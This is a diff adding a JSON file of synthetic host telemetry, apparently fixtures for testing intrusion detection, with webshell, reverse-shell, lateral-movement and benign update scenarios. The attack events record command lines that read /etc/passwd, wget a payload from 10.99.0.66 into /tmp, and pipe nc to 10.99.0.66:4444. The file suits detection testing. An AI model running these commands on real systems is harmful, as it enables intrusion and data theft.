@@ -1,0 +1,449 @@
+{
+ "webshell": [
+  {
+   "evento_id": "EVT-000004",
+   "ts": "2026-11-14T22:22:55.021Z",
+   "ts_recibido": "2026-11-14T22:22:55.790Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sh -c id; sleep 1; true",
+    "padre": "php-fpm",
+    "pid": 75,
+    "ppid": 69,
+    "proceso": "sh",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000005",
+   "ts": "2026-11-14T22:22:55.021Z",
+   "ts_recibido": "2026-11-14T22:22:55.790Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sleep 1",
+    "padre": "sh",
+    "pid": 77,
+    "ppid": 75,
+    "proceso": "sleep",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000006",
+   "ts": "2026-11-14T22:22:56.358Z",
+   "ts_recibido": "2026-11-14T22:22:56.825Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sh -c uname -a; sleep 1; true",
+    "padre": "php-fpm",
+    "pid": 78,
+    "ppid": 69,
+    "proceso": "sh",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000007",
+   "ts": "2026-11-14T22:22:56.358Z",
+   "ts_recibido": "2026-11-14T22:22:56.825Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sleep 1",
+    "padre": "sh",
+    "pid": 80,
+    "ppid": 78,
+    "proceso": "sleep",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000008",
+   "ts": "2026-11-14T22:22:57.651Z",
+   "ts_recibido": "2026-11-14T22:22:57.858Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sh -c cat /etc/passwd; sleep 1; true",
+    "padre": "php-fpm",
+    "pid": 81,
+    "ppid": 69,
+    "proceso": "sh",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000009",
+   "ts": "2026-11-14T22:22:57.651Z",
+   "ts_recibido": "2026-11-14T22:22:57.858Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sleep 1",
+    "padre": "sh",
+    "pid": 83,
+    "ppid": 81,
+    "proceso": "sleep",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000010",
+   "ts": "2026-11-14T22:22:58.987Z",
+   "ts_recibido": "2026-11-14T22:22:59.911Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "wget -q -T 3 -O /tmp/.x http://10.99.0.66/x",
+    "ips_mencionadas": [
+     "10.99.0.66"
+    ],
+    "padre": "php-fpm",
+    "pid": 84,
+    "ppid": 69,
+    "proceso": "wget",
+    "segmentos_mencionados": [
+     "externo"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000011",
+   "ts": "2026-11-14T22:22:58.987Z",
+   "ts_recibido": "2026-11-14T22:22:59.911Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "syn_enviado",
+    "ip_destino": "10.99.0.66",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 80,
+    "puerto_origen": 33482,
+    "segmento_remoto": "externo"
+   }
+  }
+ ],
+ "reverse-shell": [
+  {
+   "evento_id": "EVT-000012",
+   "ts": "2026-11-14T22:23:06.715Z",
+   "ts_recibido": "2026-11-14T22:23:06.942Z",
+   "host": "api-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sh -c sleep 3 | nc 10.99.0.66 4444",
+    "ips_mencionadas": [
+     "10.99.0.66"
+    ],
+    "padre": "node",
+    "pid": 19,
+    "ppid": 13,
+    "proceso": "sh",
+    "segmentos_mencionados": [
+     "externo"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000013",
+   "ts": "2026-11-14T22:23:06.717Z",
+   "ts_recibido": "2026-11-14T22:23:06.942Z",
+   "host": "api-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sleep 3",
+    "padre": "sh",
+    "pid": 20,
+    "ppid": 19,
+    "proceso": "sleep",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000014",
+   "ts": "2026-11-14T22:23:06.719Z",
+   "ts_recibido": "2026-11-14T22:23:06.942Z",
+   "host": "api-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "nc 10.99.0.66 4444",
+    "ips_mencionadas": [
+     "10.99.0.66"
+    ],
+    "padre": "sh",
+    "pid": 21,
+    "ppid": 19,
+    "proceso": "nc",
+    "segmentos_mencionados": [
+     "externo"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000015",
+   "ts": "2026-11-14T22:23:06.720Z",
+   "ts_recibido": "2026-11-14T22:23:06.942Z",
+   "host": "api-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "syn_enviado",
+    "ip_destino": "10.99.0.66",
+    "ip_origen": "10.20.0.12",
+    "puerto_destino": 4444,
+    "puerto_origen": 40493,
+    "segmento_remoto": "externo"
+   }
+  }
+ ],
+ "movimiento-lateral": [
+  {
+   "evento_id": "EVT-000016",
+   "ts": "2026-11-14T22:23:21.282Z",
+   "ts_recibido": "2026-11-14T22:23:21.288Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sh -c sleep 2 | nc 10.20.0.13 22",
+    "ips_mencionadas": [
+     "10.20.0.13"
+    ],
+    "padre": "php-fpm",
+    "pid": 91,
+    "ppid": 85,
+    "proceso": "sh",
+    "segmentos_mencionados": [
+     "servicios"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000017",
+   "ts": "2026-11-14T22:23:21.284Z",
+   "ts_recibido": "2026-11-14T22:23:21.288Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "sleep 2",
+    "padre": "sh",
+    "pid": 92,
+    "ppid": 91,
+    "proceso": "sleep",
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000018",
+   "ts": "2026-11-14T22:23:21.285Z",
+   "ts_recibido": "2026-11-14T22:23:21.288Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "nc 10.20.0.13 22",
+    "ips_mencionadas": [
+     "10.20.0.13"
+    ],
+    "padre": "sh",
+    "pid": 93,
+    "ppid": 91,
+    "proceso": "nc",
+    "segmentos_mencionados": [
+     "servicios"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000019",
+   "ts": "2026-11-14T22:23:21.286Z",
+   "ts_recibido": "2026-11-14T22:23:21.288Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "establecida",
+    "ip_destino": "10.20.0.13",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 22,
+    "puerto_origen": 34685,
+    "segmento_remoto": "servicios"
+   }
+  },
+  {
+   "evento_id": "EVT-000020",
+   "ts": "2026-11-14T22:23:21.314Z",
+   "ts_recibido": "2026-11-14T22:23:21.948Z",
+   "host": "db-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "entrante",
+    "estado": "establecida",
+    "ip_destino": "10.20.0.13",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 22,
+    "puerto_origen": 34685,
+    "segmento_remoto": "servicios"
+   }
+  }
+ ],
+ "actualizacion": [
+  {
+   "evento_id": "EVT-000021",
+   "ts": "2026-11-14T22:23:28.070Z",
+   "ts_recibido": "2026-11-14T22:23:28.428Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "wget -q -T 5 -O /tmp/APKINDEX.tar.gz http://10.10.0.5/alpine/APKINDEX.tar.gz",
+    "ips_mencionadas": [
+     "10.10.0.5"
+    ],
+    "padre": "cron",
+    "pid": 100,
+    "ppid": 94,
+    "proceso": "wget",
+    "segmentos_mencionados": [
+     "gestion"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000022",
+   "ts": "2026-11-14T22:23:28.070Z",
+   "ts_recibido": "2026-11-14T22:23:28.428Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "establecida",
+    "ip_destino": "10.10.0.5",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 80,
+    "puerto_origen": 45040,
+    "segmento_remoto": "gestion"
+   }
+  }
+ ],
+ "firmas": [
+  {
+   "evento_id": "EVT-000023",
+   "ts": "2026-11-14T22:23:39.452Z",
+   "ts_recibido": "2026-11-14T22:23:40.271Z",
+   "host": "db-01",
+   "segmento": "servicios",
+   "tipo": "proceso",
+   "datos": {
+    "cmdline": "wget -q -T 5 -O /tmp/firmas.db http://10.10.0.5/firmas/main.cvd",
+    "ips_mencionadas": [
+     "10.10.0.5"
+    ],
+    "padre": "cron",
+    "pid": 25,
+    "ppid": 19,
+    "proceso": "wget",
+    "segmentos_mencionados": [
+     "gestion"
+    ],
+    "usuario": "nodo"
+   }
+  },
+  {
+   "evento_id": "EVT-000024",
+   "ts": "2026-11-14T22:23:39.452Z",
+   "ts_recibido": "2026-11-14T22:23:40.271Z",
+   "host": "db-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "establecida",
+    "ip_destino": "10.10.0.5",
+    "ip_origen": "10.20.0.13",
+    "puerto_destino": 80,
+    "puerto_origen": 55374,
+    "segmento_remoto": "gestion"
+   }
+  }
+ ],
+ "pruebas_de_red": [
+  {
+   "evento_id": "EVT-000001",
+   "ts": "2026-11-14T22:21:50.048Z",
+   "ts_recibido": "2026-11-14T22:21:50.626Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "syn_enviado",
+    "ip_destino": "10.10.0.10",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 22,
+    "puerto_origen": 55586,
+    "segmento_remoto": "gestion"
+   }
+  },
+  {
+   "evento_id": "EVT-000002",
+   "ts": "2026-11-14T22:21:55.272Z",
+   "ts_recibido": "2026-11-14T22:21:55.731Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "syn_enviado",
+    "ip_destino": "10.30.0.30",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 22,
+    "puerto_origen": 47370,
+    "segmento_remoto": "soc"
+   }
+  },
+  {
+   "evento_id": "EVT-000003",
+   "ts": "2026-11-14T22:21:58.788Z",
+   "ts_recibido": "2026-11-14T22:21:58.792Z",
+   "host": "web-01",
+   "segmento": "servicios",
+   "tipo": "conexion",
+   "datos": {
+    "direccion": "saliente",
+    "estado": "syn_enviado",
+    "ip_destino": "10.99.0.66",
+    "ip_origen": "10.20.0.11",
+    "puerto_destino": 80,
+    "puerto_origen": 54970,
+    "segmento_remoto": "externo"
+   }
+  }
+ ]
+}
